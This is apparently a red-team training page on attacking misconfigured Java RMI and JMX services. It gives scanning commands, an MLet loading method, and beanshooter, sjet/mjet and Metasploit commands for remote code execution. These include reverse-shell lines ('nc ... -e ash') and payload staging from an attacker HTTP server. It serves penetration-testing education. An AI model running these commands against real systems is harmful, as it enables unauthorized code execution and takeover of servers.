---
layout: training-page
title: "Java RMI Attacks — Red Team Academy"
module: "Web Hacking"
tags:
  - java
  - rmi
  - jmx
  - rce
  - deserialization
page_key: "web-java-rmi"
render_with_liquid: false
---

# Java RMI Attacks

Java RMI (Remote Method Invocation) allows Java objects to invoke methods on objects running in a different JVM, including on remote machines. When RMI services are misconfigured — particularly when JMX (Java Management Extensions) is exposed — attackers can achieve Remote Code Execution by loading malicious MBeans or triggering deserialization gadget chains.

## Detection

### Nmap Service Scan

```
nmap -sV --script "rmi-dumpregistry or rmi-vuln-classloader" -p TARGET_PORT TARGET_IP -Pn -v
```

Vulnerable output example:

```
1089/tcp open  java-rmi Java RMI
| rmi-vuln-classloader:
|   VULNERABLE:
|   RMI registry default configuration remote code execution vulnerability
|     State: VULNERABLE
|       Default configuration of RMI registry allows loading classes from remote URLs
| rmi-dumpregistry:
|   jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
```

### Remote Method Guesser — Port Scan

```
# Scan all ports for RMI services
rmg scan 172.17.0.2 --ports 0-65535

# Enumerate bound names on a discovered RMI registry
rmg enum 172.17.0.2 9010
```

Example output from `rmg enum`:

```
[+] RMI registry bound names:
[+]  - plain-server2
[+]   --> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
[+]       Endpoint: iinsecure.dev:39153 ObjID: [-af587e6:17d6f7bb318:-7ff7, 9040809218460289711]
[+]  - legacy-service
[+]   --> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub (unknown class)
```

### Metasploit Scanner

```
use auxiliary/scanner/misc/java_rmi_server
set RHOSTS <IPs>
set RPORT <PORT>
run
```

## Attack Methodology

When a JMX service is exposed and unauthenticated, the canonical attack path is:

1. Host an MLet file and a JAR containing a malicious MBean on an attacker-controlled HTTP server.
2. Create a `javax.management.loading.MLet` MBean instance on the target via JMX.
3. Call `getMBeansFromURL` on that instance, passing the URL of the MLet file.
4. The JMX service fetches and loads the JAR, making the malicious MBean available.
5. Invoke methods on the malicious MBean to execute commands.

## RCE with beanshooter

beanshooter is a modern JMX enumeration and attack tool that covers the full lifecycle:

```
# Enumerate the JMX endpoint
beanshooter enum 172.17.0.2 1090

# List registered MBeans
beanshooter list 172.17.0.2 9010

# List available attributes on a known MBean
beanshooter info 172.17.0.2 9010

# Read a specific attribute value
beanshooter attr 172.17.0.2 9010 java.lang:type=Memory Verbose

# Set an attribute value
beanshooter attr 172.17.0.2 9010 java.lang:type=Memory Verbose true --type boolean

# Invoke a method on a known MBean
beanshooter invoke 172.17.0.2 1090 com.sun.management:type=DiagnosticCommand --signature 'vmVersion()'

# Bruteforce a password-protected JMX service
beanshooter brute 172.17.0.2 1090

# Deploy a custom MBean from a JAR hosted on attacker HTTP server
beanshooter deploy 172.17.0.2 9010 non.existing.example.ExampleBean qtc.test:type=Example \
  --jar-file exampleBean.jar --stager-url http://172.17.0.1:8000
```

### Invoke Arbitrary Static Java Methods

```
beanshooter model 172.17.0.2 9010 de.qtc.beanshooter:version=1 java.io.File 'new java.io.File("/")'
beanshooter invoke 172.17.0.2 9010 de.qtc.beanshooter:version=1 --signature 'list()'
```

### Standard MBean RCE

```
beanshooter standard 172.17.0.2 9010 exec 'nc 172.17.0.1 4444 -e ash'
```

### Deserialization Attack

```
beanshooter serial 172.17.0.2 1090 CommonsCollections6 "nc 172.17.0.1 4444 -e ash" \
  --username admin --password admin
```

## RCE with sjet / mjet

Requirements: Jython installed, JMX service can reach attacker HTTP server, no JMX authentication.

```
# sjet — install malicious MBean, run commands, drop to shell
jython sjet.py TARGET_IP TARGET_PORT super_secret install http://ATTACKER_IP:8000 8000
jython sjet.py TARGET_IP TARGET_PORT super_secret command "ls -la"
jython sjet.py TARGET_IP TARGET_PORT super_secret shell
jython sjet.py TARGET_IP TARGET_PORT super_secret password this-is-the-new-password
jython sjet.py TARGET_IP TARGET_PORT super_secret uninstall

# mjet — with credentials, deserialization attack
jython mjet.py --jmxrole admin --jmxpassword adminpassword TARGET_IP TARGET_PORT \
  deserialize CommonsCollections6 "touch /tmp/xxx"

# mjet — install and command execution
jython mjet.py TARGET_IP TARGET_PORT install super_secret http://ATTACKER_IP:8000 8000
jython mjet.py TARGET_IP TARGET_PORT command super_secret "whoami"
jython mjet.py TARGET_IP TARGET_PORT command super_secret shell
```

## RCE with Metasploit

```
use exploit/multi/misc/java_rmi_server
set RHOSTS <IPs>
set RPORT <PORT>
run
```

## Tools

- [qtc-de/beanshooter](https://github.com/qtc-de/beanshooter) — JMX enumeration and attacking tool
- [qtc-de/remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) — Java RMI vulnerability scanner
- [siberas/sjet](https://github.com/siberas/sjet) — siberas JMX exploitation toolkit
- [mogwailabs/mjet](https://github.com/mogwailabs/mjet) — MOGWAI LABS JMX exploitation toolkit

## Resources

- Attacking RMI Based JMX Services — Hans-Martin Münch — `mogwailabs.de/en/blog/2019/04/attacking-rmi-based-jmx-services/`
- JMX RMI — Multiple Applications RCE — Red Timmy Security — `exploit-db.com/docs/english/46607-jmx-rmi`
- remote-method-guesser — BHUSA 2021 Arsenal — Tobias Neitzel
